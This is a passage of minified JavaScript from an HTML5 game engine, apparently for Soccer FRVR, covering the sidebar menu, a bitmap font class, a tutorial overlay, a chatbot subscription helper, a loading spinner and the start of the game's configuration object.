        LEGACY_COORD_SYSTEM ? XS.stageContainer.addChild(e.icon) : XS.gui.addChild(e.icon), m.x = -24, e.content = new ScrollContainer(500, 500), e.content.allowScrollX = !1, LEGACY_COORD_SYSTEM && (e.content.ratio = .5 * v), e.content.y = XS.styles.margins.top * v, e.addChild(e.content);
        var _ = -i * v * a;
        e.show = function() {
            if ("hidden" === e.status) {
                e.status = "transitioning", XS.stageContainer.addChild(window.Sidebar), XS.stageContainer.addChild(m), b(), window.Sidebar.x = _, m.x = -24, window.Sidebar.content.content.y = 0, Tween.clear(stage), Tween.clear(m), Tween.clear(e.icon);
                var t = 1,
                    n = 1;
                LEGACY_COORD_SYSTEM && (t = XS.devicePixelRatio, n = 2 / XS.devicePixelRatio), new Tween(window.Sidebar, {
                    x: 0
                }, .3, void 0, ENG_FRZ_GRP), new Tween(stage, {
                    x: (i * a + XS.styles.margins.left) * t
                }, .3, void 0, ENG_FRZ_GRP), new Tween(m, {
                    x: (i * a + XS.styles.margins.left) * t - 24
                }, .3, void 0, ENG_FRZ_GRP), LEGACY_COORD_SYSTEM ? new Tween(e.icon, {
                    x: (i + XS.styles.margins.left) * t * n + s
                }, .3, void 0, ENG_FRZ_GRP) : new Tween(XS.gui, {
                    x: (i * a + XS.styles.margins.left) * t
                }, .3, void 0, ENG_FRZ_GRP), new Tween(e.icon, {
                    alpha: 0
                }, .15, void 0, ENG_FRZ_GRP).call(function() {
                    e.icon.frame = 1, new Tween(e.icon, {
                        alpha: 1
                    }, .15, void 0, ENG_FRZ_GRP)
                }), e.sounds.show && e.sounds.show.play(), XS.emit("togglesidebar", {
                    visible: !0
                }), XS.track.customEvent("sidebar_open", 1), XS.freeze(), XS.setTimeout(function() {
                    e.status = "showing"
                }, 400, [], ENG_FRZ_GRP)
            }
        }, e.hide = function(t) {
            "showing" === e.status && (h = 0, c = 0, e.status = "transitioning", Tween.clear(stage), Tween.clear(m), Tween.clear(e.icon), new Tween(window.Sidebar, {
                x: _
            }, .3, void 0, ENG_FRZ_GRP), new Tween(stage, {
                x: 0
            }, .3, void 0, ENG_FRZ_GRP).call(function() {
                window.Sidebar.parent && window.Sidebar.parent.removeChild(window.Sidebar)
            }), new Tween(m, {
                x: -24
            }, .3, void 0, ENG_FRZ_GRP), LEGACY_COORD_SYSTEM ? new Tween(e.icon, {
                x: 0
            }, .3, void 0, ENG_FRZ_GRP) : new Tween(XS.gui, {
                x: 0
            }, .3, void 0, ENG_FRZ_GRP), new Tween(e.icon, {
                x: XS.styles.margins.left ? (XS.styles.margins.left + 5) / .5 : 25
            }, .3, void 0, ENG_FRZ_GRP), new Tween(e.icon, {
                alpha: 0
            }, .15, void 0, ENG_FRZ_GRP).call(function() {
                e.icon.frame = 0, new Tween(e.icon, {
                    alpha: 1
                }, .15, void 0, ENG_FRZ_GRP)
            }), e.sounds.hide && e.sounds.hide.play(), XS.setTimeout(function() {
                XS.unfreeze(), XS.emit("togglesidebar", {
                    visible: !1
                }), e.status = "hidden", "function" == typeof t && t()
            }, 400, [], ENG_FRZ_GRP))
        };
        var T = 0;
        e.addMenuHeader = function(t) {
            var n = new Container,
                a = new Graphics,
                s = 1;
            LEGACY_COORD_SYSTEM && (s = XS.devicePixelRatio), a.beginFill(2236962), LEGACY_COORD_SYSTEM && (o = 34), a.drawRect(r * s, -2 * s, (i - r) * s, o * s), n.addChild(a), a.on("down", function() {
                u || (d != a ? (debugShadowPressCount = 0, d = a, 8 == ++h && (u = !0, XS.emit("spawndebugmenu"))) : h = 0)
            }, {
                freezeGroup: ENG_FRZ_GRP
            });
            var l = 35;
            LEGACY_COORD_SYSTEM && (l = 35);
            t = new Text2(t, {
                weight: XS.is.safari || XS.is.iOS ? 300 : 200,
                size: l,
                fill: "#FFFFFF"
            });
            n.addChild(t), t.x = 22, t.y = 12, n.addChild(t), n.y = T, e.content.addChild(n);
            var c = 128;
            n.scrollHeight = 64, XS.is.usingCanvasRenderer && (c = 64), LEGACY_COORD_SYSTEM ? (c = 64, n.scrollHeight = 64) : c = 84, T += c
        };

        function C(t, i, n, r) {
            var o = 1;
            return LEGACY_COORD_SYSTEM && (o = XS.devicePixelRatio), t.ratio = o / 2, t.x = i, t.y = n, t.resolution = 1, t.hitArea = new Rectangle(0, 0, 50 * o, 50 * o), void 0 !== r && (t.interactive = !0, t.buttonMode = !0, t.defaultCursor = "pointer", t.on("down", function() {
                e.content.callback = function() {
                    XS.navigate(r)
                }
            }, {
                freezeGroup: ENG_FRZ_GRP
            })), t
        }
        e.addMenuToggle = function(t, o, a, s, l) {
            var h = new Container,
                d = 1;
            LEGACY_COORD_SYSTEM && (d = XS.devicePixelRatio), t.resolution = XS.devicePixelRatio, t.x = 15, t.y = 15, h.addChild(t);
            var c = new Graphics;
            h.addChild(c), c.lineStyle(1, 0, .2), c.moveTo(-100 * d, 0), c.lineTo(i * d, 0), c.lineStyle(1, 16777215, .2), c.moveTo(-100 * d, 1 * d), c.lineTo(i * d, 1 * d), c.y = n * d, LEGACY_COORD_SYSTEM || c.scale.set(1, 1 / e.scale.y), h.interactive = !0, h.buttonMode = !0, h.defaultCursor = "pointer", h.y = T;
            var u = C(new Sprite(XS.utils.clipImage(fetch("i/g/s/sidebar.svg", !0), 167, 0, 100, 60)), 388, 10);
            h.addChild(u);
            var f = C(new Sprite(XS.utils.clipImage(fetch("i/g/s/sidebar.svg", !0), 0, 0, 104, 64)), 386, 8);
            h.addChild(f);
            var p = C(new Sprite(XS.utils.clipImage(fetch("i/g/s/sidebar.svg", !0), 105, 0, 61, 59)), 427, 12);
            h.addChild(p);
            var g = new Text2(o, {
                weight: XS.is.safari || XS.is.iOS ? 300 : 200,
                size: 35,
                fill: "#ffffff",
                maxWidth: l
            });
            h.addChild(g), g.x = 80, g.y = 22;
            var v = !0;

            function m(e) {
                (v = void 0 !== e ? e : !v) ? (new Tween(p, {
                    x: 427
                }, .2, void 0, ENG_FRZ_GRP), new Tween(u, {
                    alpha: 1
                }, .2, void 0, ENG_FRZ_GRP)) : (new Tween(p, {
                    x: 389
                }, .2, void 0, ENG_FRZ_GRP), new Tween(u, {
                    alpha: 0
                }, .2, void 0, ENG_FRZ_GRP))
            }
            return h.hitArea = new Rectangle(r * d, 0, (i - r) * d, n * d), h.on("down", function() {
                e.content.callback = function() {
                    m(!v), s(v)
                }
            }, {
                freezeGroup: ENG_FRZ_GRP
            }), m(a), e.content.addChild(h), h.scrollHeight = 84, T += 84, h.toggle = m, h
        }, e.hideIcon = function() {
            e.icon.visible = !1, window.dirtyOnce = !0, e.emit("hideicon")
        }, e.showIcon = function() {
            e.icon.visible = !0, window.dirtyOnce = !0, e.emit("showicon")
        }, e.popIcon = function() {
            e.icon.parent.addChild(e.icon)
        }, e.addMenuItem = function(t, o, a) {
            // var s = new Container,
            //     l = 1;
            // LEGACY_COORD_SYSTEM && (l = XS.devicePixelRatio), t.resolution = XS.devicePixelRatio, t.x = 15, t.y = 15, s.addChild(t);
            // var h = new Graphics;
            // s.addChild(h), h.lineStyle(1, 0, .2), h.moveTo(-100 * l, 0), h.lineTo(i * l, 0), h.lineStyle(1, 16777215, .2), h.moveTo(-100 * l, 1 * l), h.lineTo(i * l, 1 * l), h.y = n * l, LEGACY_COORD_SYSTEM || h.scale.set(1, 1 / e.scale.y), s.interactive = !0, s.buttonMode = !0, s.defaultCursor = "pointer", s.y = T, s.hitArea = new Rectangle(r * l, 0, (i - r) * l, n * l);
            // var d = new Text2(o, {
            //     weight: XS.is.safari || XS.is.iOS ? 300 : 200,
            //     size: 35,
            //     fill: "#ffffff"
            // });
            // return s.addChild(d), d.x = 80, d.y = 22, e.content.addChild(s), s.scrollHeight = 84, T += 84, s.on("down", function() {
            //     e.content.callback = function() {
            //         a && a()
            //     }
            // }, {
            //     freezeGroup: ENG_FRZ_GRP
            // }), s
        }, e.addMenuItemAt = function(t, i, n, r) {
            var o = e.addMenuItem(i, n, r);
            return e.content.addChildAt(o, t), e.reAlignItems(), o
        }, e.addMenuItemAfter = function(t, i, n, r) {
            for (var o = e.addMenuItem(i, n, r), a = e.content.getChildren(), s = 0; s < a.length && a[s] != t; s++);
            return e.content.addChildAt(o, s + 1), e.reAlignItems(), o
        }, e.removeMenuItem = function(t) {
            e.content.removeChild(t) && (T -= 84)
        }, e.reAlignItems = function() {
            T = 0;
            for (var t = e.content.getChildren(), i = 0; i < t.length; i++) {
                var n = t[i];
                n.y = T, T += n.scrollHeight
            }
        }, e.addItem = function(t) {
            var i, n = (t = t || {}).name || t.label,
                r = t.type,
                o = t.icon || f,
                a = t.label || "N/A",
                s = t.value || !1,
                l = t.handler;

            function h(t) {
                "button" === r ? s = !0 : "toggle" === r && (s = t), "function" == typeof l ? l.call(i, s) : e.emit("toggle", n, s)
            }
            switch (r) {
                case "header":
                    i = e.addMenuHeader(a);
                    break;
                case "button":
                    i = e.addMenuItem(new Sprite(o), a, h);
                    break;
                case "toggle":
                    i = e.addMenuToggle(new Sprite(o), a, s, h);
                    break;
                default:
                    console.error("Invalid menu item options:", t)
            }
            return i
        }, e.addSocialBar = function() {
            // if (!("1" == Host.Web.GetQueryString("nosoc") || XS.is.okru || XS.is.rcs || XS.is.huawei || XS.is.miniclip)) {
            //     var t = new Container;
            //     t.addChild(C(new Sprite(fetch("i/g/s/icon_frvr.svg", !0)), 20, 15, "http://news.frvr.com")), t.addChild(C(new Sprite(fetch("i/g/s/icon_twitter.svg", !0)), 150, 15, "https://twitter.com/frvrgames")), t.addChild(C(new Sprite(fetch("i/g/s/icon_facebook.svg", !0)), 280, 15, Config.facebookPageUrl)), t.addChild(C(new Sprite(fetch("i/g/s/icon_gplus.svg", !0)), 410, 15, "https://plus.google.com/+Frvrgames")), t.y = T, e.content.addChild(t), t.scrollHeight = 82, T += 82
            // }
        }, e.settings = [], e.addSetting = function(t) {
            e.settings.push(t)
        }, e.addSettings = function(t) {
            if (!Config.disableSidebarSettings && (!0 !== t && e.addMenuHeader(Host.Localize.Translate("Settings")), XS.is.twitch && (XS.muteSound(!0), XS.muteMusic(!0)), XS.audio.muteSounds(XS.soundSettings.muteSound.get()), e.addMenuToggle(new Sprite(fetch("i/g/s/icon_sound.svg", !0)), Host.Localize.Translate("Sound Effects"), !XS.Sound.muted, function(e) {
                    XS.audio.muteSounds(!e)
                }), XS.audio.muteMusics(XS.soundSettings.muteMusic.get()), !XS.audio.isMusicMuted() && XS.backgroundMusic && XS.backgroundMusic.play(0, !0), e.lastMenuItem = e.addMenuToggle(new Sprite(fetch("i/g/s/icon_music.svg", !0), 1), Host.Localize.Translate("Music"), !XS.Music.muted, function(e) {
                    XS.audio.muteMusics(!e)
                }), e.settings.length > 0))
                for (var i = 0; i < e.settings.length; i++) {
                    var n = e.settings[i];
                    e.lastMenuItem = e.addMenuToggle(n.image, n.text, n.state, n.callback)
                }
        }, e.addMore = function() {
            // XS.is.facebookInstant || XS.is.twitch || XS.is.okru || (Sidebar.addMenuHeader(Host.Localize.Translate("More")), Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_frvr.svg", !0)), Host.Localize.Translate("FRVR Games"), function() {
            //     XS.navigate("https://frvr.com")
            // }), Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_feedback.svg", !0)), Host.Localize.Translate("Send Feedback"), function() {
            //     XS.navigate(Config.feedbackURL)
            // }), Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_legal.svg", !0)), Host.Localize.Translate("Legal"), function() {
            //     XS.navigate("https://frvr.com/legal/")
            // }), e.lastMenuItem = Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_credits.svg", !0)), Host.Localize.Translate("Credits"), function() {
            //     XS.navigate("https://frvr.com/credits/" + Config.id + ".html")
            // }))
        }, e.addDownloadItem = function(t, i, n) {
            e.downloadItems.push({
                image: t,
                text: i,
                callback: n
            })
        }, e.addRestartItem = function(t, i) {
            var n = i || Host.Localize.Translate("Restart Level", {}, "Level in this context is a level in a game");
            e.restartItem = {
                image: new Sprite(embed("i/g/s/icon_new.svg")),
                text: n,
                callback: function() {
                    e.hide(), XS.emit("restart"), t && t()
                }
            }
        }, e.addShopItem = function(t, i) {
            var n = i || Host.Localize.Translate("Shop");
            e.shopItem = {
                image: new Sprite(fetch("i/g/s/icon_shop.svg")),
                text: n,
                callback: function() {
                    e.hide(), t && t()
                }
            }
        }, e.addExitToMapItem = function(t, i) {
            var n = i || Host.Localize.Translate("Exit to Map");
            e.exitToMapItem = {
                image: new Sprite(embed("i/g/s/icon_map.svg")),
                text: n,
                callback: function() {
                    e.hide(), t && t()
                }
            }
        }, e.addStandards = function() {
            if (Sidebar.addMenuHeader(Config.shareTitle), e.restartItem) {
                var t = e.restartItem;
                e.lastItem = e.addMenuItem(t.image, t.text, t.callback)
            }
            if (e.shopItem) {
                t = e.shopItem;
                e.lastItem = e.addMenuItem(t.image, t.text, t.callback)
            }
            if (e.exitToMapItem) {
                t = e.exitToMapItem;
                e.lastItem = e.addMenuItem(t.image, t.text, t.callback)
            }
            if (!XS.is.facebookInstant && !XS.is.twitch) {
                var i = void 0;
                XS.insertRemoveAdsButton = function(t, n, r) {
                    Host.Log("Sidebar: Inserting 'Remove Ads' button");
                    var o = e.content.getChildren(),
                        a = 1;
                    e.restartItem && (a += 1), o.length > a ? i = Sidebar.addMenuItemAfter(o[a], t, n, r) : (Host.WrapperLog("Warning: Sidebar: Remove Ads menu item added to bottom of menu"), Sidebar.addMenuItem(t, n, r))
                }, XS.removeAdsButton = function() {
                    i ? (Host.Log("Sidebar: Removing 'Remove Ads' button"), e.removeMenuItem(i), e.reAlignItems(), i = void 0) : Host.Log("Sidebar: No adsButton defined")
                }, XS.is.facebookInstant || XS.is.spilGamesWrapper || (window.insertButton = function(t, i, n) {
                    if (!(t instanceof Sprite)) throw "Please update your code to use the new SVG icons: " + i;
                    e.lastItem ? Sidebar.addMenuItemAfter(e.lastItem, t, i, n) : Sidebar.addMenuItem(t, i, n)
                }), XS.is.spilGamesWrapper || "rt" == Config.stage || Sidebar.addMenuItem(new Sprite(fetch("i/g/s/icon_share.svg", !0)), Host.Localize.Translate("Share {game_name}", {
                    game_name: Config.shareTitle
                }), function() {
                    window.shareDialogueCallback()
                })
            }
            if (e.downloadItems.length > 0)
                for (var n = 0; n < e.downloadItems.length; ++n) {
                    t = e.downloadItems[n];
                    Sidebar.addMenuItem(new Sprite(t.image), t.text, t.callback)
                }
            Sidebar.addSettings(), XS.is.facebookInstant || XS.is.twitch || XS.is.spilGamesWrapper || (Sidebar.addMore(), Sidebar.addSocialBar()), Sidebar.buildDefaultQaDebugItems()
        }, e.addAdsDebug = function() {
            XS.ads && Config.adIds && (Sidebar.addMenuItem(new Sprite(embed("i/g/s/icon_new.svg")), "XS Ads: Preload Interstitial", function() {
                XS.ads.preload("", function(e) {}), Sidebar.hide()
            }), Sidebar.addMenuItem(new Sprite(embed("i/g/s/icon_new.svg")), "XS Ads: Show Interstitial", function() {
                XS.ads.show("", function(e) {}), Sidebar.hide()
            }), Sidebar.addMenuItem(new Sprite(embed("i/g/s/icon_new.svg")), "XS Ads: Force Interstitial", function() {
                XS.ads.force("", function(e) {}), Sidebar.hide()
            }), Sidebar.addMenuItem(new Sprite(embed("i/g/s/icon_new.svg")), "XS Ads: Preload Reward Ad", function() {
                XS.ads.preload("", function(e) {}, {
                    format: "reward"
                }), Sidebar.hide()
            }), Sidebar.addMenuItem(new Sprite(embed("i/g/s/icon_new.svg")), "XS Ads: Show Reward Ad", function() {
                XS.ads.show("", function(e) {}, {
                    format: "reward"
                }), Sidebar.hide()
            }), Sidebar.addMenuItem(new Sprite(embed("i/g/s/icon_new.svg")), "XS Ads: Force Reward Ad", function() {
                XS.ads.force("", function(e) {}, {
                    format: "reward"
                }), Sidebar.hide()
            }))
        };
        var R = [];
        e.addQaDebugItem = function(e, t) {
            "object" == typeof e ? R.push(e) : R.push({
                type: "button",
                label: e,
                handler: t
            })
        }, e.addQaDebug = function() {
            for (var t = 0; t < R.length; t++) e.addItem(R[t])
        }, e.buildDefaultQaDebugItems = function() {
            function t() {
                "function" == typeof window.debugOutputData ? window.debugOutputData() : (console.warn("debugOutputData function not implemented in game. Trying standard XS.data.toString"), XS.data ? console.log(XS.data.toString()) : console.warn("Game doesn't use XS.data")), Sidebar.hide()
            }
            e.addQaDebugItem("Force Game Over", function() {
                "function" == typeof window.debugShowGameOver ? window.debugShowGameOver() : XS.is.facebookInstant ? (console.warn("debugShowGameOver function not implemented in game. Trying standards"), "function" == typeof window.Social.Instant.showGameOver ? window.Social.Instant.showGameOver() : "function" == typeof window.Social.Instant.onGameOver ? window.Social.Instant.onGameOver() : console.warn("No applicable standard functions found")) : console.warn("debugShowGameOver function not implemented in game."), Sidebar.hide()
            }), e.addQaDebugItem("Force Retry Overlay", function() {
                "function" == typeof window.debugForceRetry ? window.debugForceRetry() : console.warn("debugForceRetry function not implemented in game."), Sidebar.hide()
            }), e.addQaDebugItem("XS Data output elements", function() {
                t()
            }), e.addQaDebugItem("XS Data reset to defaults", function() {
                "function" == typeof window.debugResetData ? (window.debugResetData(), t()) : (console.warn("debugResetData function not implemented in game. Trying standard XS.data.resetToDefaults"), XS.data ? (XS.data.resetToDefaults(), t()) : console.warn("Game doesn't use XS.data")), Sidebar.hide()
            })
        }, e.addBuildInfo = function() {
            if (e.addMenuHeader("Version: " + Config.version + "(" + Config.build + ")"), Config.frvr_repo_statuses) {
                e.addMenuHeader("Build Info:");
                var t = JSON.parse(Config.frvr_repo_statuses);
                for (var i in t)
                    if (t.hasOwnProperty(i)) {
                        var n = i,
                            r = n[0];
                        0 == n.indexOf("frvr") && (r = n[5]);
                        var o = t[n],
                            a = o.hash.substring(0, 8),
                            s = o.dirty ? "(!)" : "",
                            l = o.branch ? o.branch.substring(0, 25) : "n/a",
                            h = o.tag ? o.tag : "n/a";
                        if (e.addMenuHeader("------------------"), e.addMenuHeader(r), e.addMenuHeader("> h: " + a + " " + s), e.addMenuHeader("> b: " + l), e.addMenuHeader("> t: " + h), o.toolsSubmoduleType && e.addMenuHeader("> sm-ty: " + o.toolsSubmoduleType), o.toolsSubmoduleHash) {
                            var d = o.toolsSubmoduleHash.substring(0, 8),
                                c = o.toolsSubmoduleDirty ? "(!)" : "";
                            e.addMenuHeader("> sm-h: " + d + " " + c)
                        }
                        o.toolsSubmoduleBranch && e.addMenuHeader("> sm-b: " + o.toolsSubmoduleBranch), o.toolsSubmoduleTag && e.addMenuHeader("> sm-t: " + o.toolsSubmoduleTag)
                    }
                e.addMenuHeader("------------------")
            }
            Config.build_time && (e.addMenuHeader("Build Time (UTC):"), e.addMenuHeader("> " + Config.build_time)), Config.template && e.addMenuHeader("Template: " + Config.template);
            var u = XS.is.usingWebGLRenderer ? "WebGL" : XS.is.usingCanvasRenderer ? "Canvas" : "Unknown";
            e.addMenuHeader("Renderer: " + u), e.addMenuHeader("Coords: " + (LEGACY_COORD_SYSTEM ? "Legacy" : "New")), Host.GetMemoryUsage && Host.GetMemoryUsage(function(e) {
                Host.Log("free memory: " + e.freememory), Host.Log("total memory: " + e.totalmemory)
            })
        }, stage.on("down", function() {
            "showing" === e.status && e.hide()
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), XS.on("resize", function() {
            var t = 1,
                n = 1 / e.scale.x;
            LEGACY_COORD_SYSTEM && (t = XS.devicePixelRatio, n = 1), e.icon.ratio = .5 * t, "hidden" === e.status ? (e.icon.x = XS.styles.margins.left ? (XS.styles.margins.left + 5) / .5 : 25, m.x = -24, stage.x = 0) : (m.x = (i * a + XS.styles.margins.left) * t - 24, stage.x = (i * a + XS.styles.margins.left) * t), e.icon.y = XS.styles.margins.top ? (XS.styles.margins.top + 5) / .5 : 25, e.content.y = XS.styles.margins.top * t, e.content.x = XS.styles.margins.left * t, _ = -(i * a + XS.styles.margins.left) * t, height != y && (y = height, w.width = 25, LEGACY_COORD_SYSTEM ? w.height = height * t * n : w.height = 4, S.fillStyle = x, S.fillRect(0, 0, w.width, w.height), m.texture.destroy(!0), m.setTexture(new Texture.fromCanvas(w)), b()), g.width = (i * a + XS.styles.margins.left) * t * n, e.content.resize(2 * (i + XS.styles.margins.left) * t, 2 * (height - XS.styles.margins.top)), LEGACY_COORD_SYSTEM || e.applyResolutionRecursive()
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), LEGACY_COORD_SYSTEM || e.applyResolutionRecursive()
    }, Sidebar.prototype = Object.create(Container.prototype), Sidebar.prototype.constructor = Sidebar, window.Sidebar = new Sidebar
}), XS.modulesToPreload.push(function() {
    var e = Container.expand(function(e) {
        var t = e.width,
            i = e.height,
            n = e.image,
            r = e.offsets,
            o = e.letterWidths || {},
            a = e.scale,
            s = 0,
            l = void 0 !== e.spaceWidthMultiplier ? e.spaceWidthMultiplier : 1,
            h = e.textAlign || "left",
            d = e.verticalAlign || "top",
            c = Container.call(this),
            u = [],
            f = 0;
        if (Object.defineProperty(c, "tint", {
                get: function() {
                    return f
                },
                set: function(e) {
                    f = e;
                    for (var t = 0; t < u.length; t++) u[t].tint = f
                }
            }), e.tint && (c.tint = e.tint), LEGACY_COORD_SYSTEM) {
            if (void 0 !== a) {
                var p = c.forceSetRatio;
                c.forceSetRatio = function(e) {
                    p.call(this, -1 == e ? -1 : e * a)
                }
            }
        } else void 0 !== a && (c.scale.set(a), c.resolution = a);

        function g() {
            var e = 0,
                t = 0;
            "right" == h && (e = -s), "center" == h && (e = -s / 2), "bottom" == d && (t = -i), "center" == d && (t = -i / 2);
            for (var n = 0; n < u.length; n++) u[n].x = e, u[n].y = t, e += u[n].letterWidth
        }
        Object.defineProperty(c, "textAlign", {
            get: function() {
                return h
            },
            set: function(e) {
                h = e, g()
            }
        }), Object.defineProperty(c, "verticalAlign", {
            get: function() {
                return d
            },
            set: function(e) {
                d = e, g()
            }
        });
        var v = [],
            m = {
                letterWidth: t * l
            };
        c.getPixelWidth = function() {
            return s * (a || 1)
        }, c.text = "", c.setText = function(e) {
            var a = e.toString();
            if (a != c.text) {
                c.text = a;
                var l = a.split("");
                s = 0;
                for (var h = [], d = 0; d < l.length; d++) {
                    var p = l[d];
                    " " !== p && void 0 === r[p] ? console.warn('Definition not defined for "' + p + '" defaulting to space') : (" " === p ? nm = m : (nm = u.shift(), nm && nm != m || (nm = v.pop() || new Sheet(n, t, i), nm.tint = f, nm.letterWidth = void 0 !== o[p] ? o[p] : t, c.addChild(nm)), nm.frame = r[p]), h.push(nm), s += nm.letterWidth)
                }
                for (; u.length;) {
                    var y = u.pop();
                    y != m && (v.push(y), c.removeChild(y))
                }
                u = h, g()
            }
        }
    });
    window.BitmapFont = e
}), XS.modulesToPreload.push(function() {
    function e(e, t) {
        Container.call(this);
        var i = new Graphics;
        i.beginFill(16777215, .9), this.addChild(i);
        var n = new Text2(e, {
            weight: 400,
            size: 110,
            fill: "#000000",
            align: "center",
            maxWidth: 1950
        });
        n.anchor.set(.5, 0), this.addChild(n), n.x = 1e3, n.y = 25;
        var r = new Text2(t, {
            weight: 300,
            size: 80,
            fill: "#000000",
            align: "center",
            maxWidth: 1950
        });
        r.anchor.set(.5, 0), this.addChild(r), r.x = 1e3, r.y = n.y + n.height + 20;
        var o = r.y + r.height + 40;
        i.drawRoundedRect(0, 0, 2e3, o, 35), this.setRatio = function(e) {
            i.width = 2e3 * e, i.height = 400 * e
        }
    }
    e.prototype = Object.create(Container.prototype), e.prototype.constructor = e;
    var t = null;
    window.Tutorial = new function() {
        var i = this;
        this.show = function(n, r, o, a, s) {
            return t && i.hide(), (t = new e(a, s)).x = r - 1e3, t.y = o - 400 + 150, n.addChild(t), t.alpha = 0, new Tween(t, {
                y: o - 400,
                alpha: 1
            }, .5, void 0, ENG_FRZ_GRP), t
        }, this.hide = function() {
            t && (new Tween(t, {
                y: t.y - 150,
                alpha: 0
            }, .5, void 0, ENG_FRZ_GRP).call(function() {
                this.parent.removeChild(this)
            }), t = void 0)
        }, this.get = function() {
            return t
        }
    }
}), XS.modulesToPreload.push(function() {
    var e = window.Social.getPromiseCatchHandler;

    function t() {}
    t.prototype.showPopup = function(t) {
        var i;
        return (Config.preventAutomaticBotSubscription ? Promise.resolve(!1) : -1 === FBInstant.getSupportedAPIs().indexOf("player.canSubscribeBotAsync") ? Promise.resolve(!1) : FBInstant.player.canSubscribeBotAsync()).then(function(e) {
            return e ? (XS.track.event("chatbot_show"), FBInstant.player.subscribeBotAsync().then(function() {
                return "success"
            })) : "noshow"
        }).catch(function(e) {
            switch (e.code) {
                case "USER_INPUT":
                    return "useraborted";
                case "INVALID_OPERATION":
                    return "issubscribed";
                default:
                    return i = e.code, "error"
            }
        }).then(function(e) {
            return XS.track.event("chatbot_" + e, {
                reason: i
            }), e
        }).catch(e("Bot.showPopup > handleResult")).then(t).catch(e("Bot.showPopup > callback"))
    }, t.prototype._showPopup = t.prototype.showPopup;
    var i = new t;
    window.bot = i
}), XS.modulesToPreload.push(function() {
    function e() {
        var e = this,
            t = 0,
            i = void 0,
            n = void 0,
            r = void 0,
            o = void 0,
            a = !1;
        e.force = function() {
            ! function() {
                if (!i) {
                    i = document.createElement("div");
                    var e = {
                        width: "100%",
                        height: "100%",
                        top: "0px",
                        left: "0px",
                        position: "absolute",
                        backgroundColor: "#000",
                        opacity: "0.7",
                        zIndex: "102",
                        display: "block"
                    };
                    for (prop in e) i.style[prop] = e[prop]
                }
                if (!n) {
                    n = document.createElement("div");
                    var t = {
                        border: "10px solid rgba(255,255,255,.3)",
                        borderTop: "10px solid #ffffff",
                        borderRight: "10px solid #ffffff",
                        borderRadius: "50%",
                        width: "100px",
                        height: "100px",
                        position: "absolute",
                        zIndex: 20,
                        left: "50%",
                        top: "50%",
                        marginLeft: "-60px",
                        marginTop: "-60px"
                    };
                    for (prop in t) n.style[prop] = t[prop]
                }
            }(), a || e.showSpinner(), document.body.appendChild(i);
            var t = 0;
            n.style.transform = "rotate(" + t + "deg)", clearInterval(r), r = setInterval(function() {
                t += 4, n.style.transform = "rotate(" + t + "deg)"
            }, 16)
        }, e.show = function(i, n) {
            a = i, 1 == ++t && (0 === n ? e.force() : o = setTimeout(e.force, n || 5))
        }, e.hide = function() {
            0 == --t && (clearTimeout(o), clearInterval(r), i && i.parentNode && i.parentNode.removeChild(i))
        }, e.hideSpinner = function() {
            n && n.parentNode && n.parentNode.removeChild(n), a = !0
        }, e.showSpinner = function() {
            i && i.appendChild(n), a = !1
        }
    }
    window.LoadSpinner = e, XS.loadSpinner = new e
});
var Config = {
    id: "soccer",
    niceId: "soccer",
    domain: ".",
    version: "1.0.6",
    build: "18",
    stage: "rc",
    shareUrl: "https://soccer.frvr.com/{{language_path}}",
    playTitle: Host.Localize.Translate("Soccer FRVR"),
    shareText: Host.Localize.Translate("I think you will like Soccer FRVR"),
    shareTitle: Host.Localize.Translate("Soccer FRVR"),
    shortTitle: Host.Localize.Translate("Soccer"),
    facebookInstantGameID: "1151316418395708",
    facebookAppId: "423297308556797",
    facebookAppUrl: "https://apps.facebook.com/soccerfrvr",
    facebookPageUrl: "https://www.facebook.com/Soccer-FRVR-103387154483038/",
    useFacebookInstantRichGameplayFeatures: !0,
    backendPath: "https://production-dot-frvr-chatbot.appspot.com/soccer",
    facebookInstantNamespace: "soccerfrvrinstant",
    facebookInstantFillColor: "#b5cbd6",
    facebookInstantScoreOverlayTextColor: "#000000",
    facebookInstantScoreOverlayShadowColor: "#ffffff",
    facebookInstantBannerStyleOverwrite: {
        style: {
            backgroundSize: "auto 420px",
            backgroundPosition: "center top"
        }
    },
    facebookHighscoreProperty: "score",
    enableCrossPromotion: !0,
    facebookCrossPromotionGames: [
        ["i/web/basketballicon.png", "800772590062226", !1],
        ["i/web/dartsicon.png", "1576469492400901", !1],
        ["i/web/foodtycoonicon.png", "705015276615797", !0, !0],
        ["i/web/golddiggericon.png", "578514565910482", !1],
        ["i/web/kittenforceicon.png", "320937505464843", !1, !0]
    ],
    gaId: "UA-54081731-1",
    gaGameId: "UA-54081731-52",
    googleAdSiteId: "2155121367",
    buttonShareTitle: Host.Localize.Translate("Share Soccer FRVR", {}, "Button text for sharing Soccer FRVR"),
    buttonShareDescription: Host.Localize.Translate("Invite your friends?"),
    iOSRemoveAdsProductIdentifier: "soccerremoveads",
    androidRemoveAdsProductIdentifier: "soccerremoveads",
    gameCenterEnabled: !1,
    feedbackURL: "https://frvr.com/support/",
    gaId: "UA-54081731-1",
    gaGameId: "UA-54081731-34",
    chromeAppEnabled: !1,
    twitterTexts: [Host.Localize.Translate("Check out Soccer FRVR, no time limit and lot of fun!"), Host.Localize.Translate("Have you ever tried Soccer FRVR? Absolutely addictive game!"), Host.Localize.Translate("You have not tried the new Soccer FRVR yet? Play now for free!"), Host.Localize.Translate("Be careful! This game can be extremely addictive! Try it now!"), Host.Localize.Translate("Can you beat my highscore in Soccer FRVR?")],
    pushNotificationText: Host.Localize.Translate("Your daily Soccer level is ready to play!", {}, "This is a push notification used on mobile phones to show that their daily level is ready"),
    twitterRelated: "frvrgames,benjaminsen,brianmeidell",
    twitterHashTags: Host.Localize.Translate("soccergame,mobilegame,casualgame,flick&kick,freekick,penaltygame,footballgame,penaltyshootout,scoregoals,worldcup,soccer,googleplay,ios,FRVR", {}, "These are are hash tags for social networks such as twitter, E.g. #puzzle or #puzzle# for chinese sites"),
    twitterHTML: '<div style="padding-right:10px"><a href="https://twitter.com/share" class="twitter-share-button" data-url="{{shareUrl}}" data-text="{{TEXT}}" data-via="FRVRGames" data-hashtags="{{twitterHashTags}}" data-related="{{twitterRelated}}" target="_new"></a></div>',
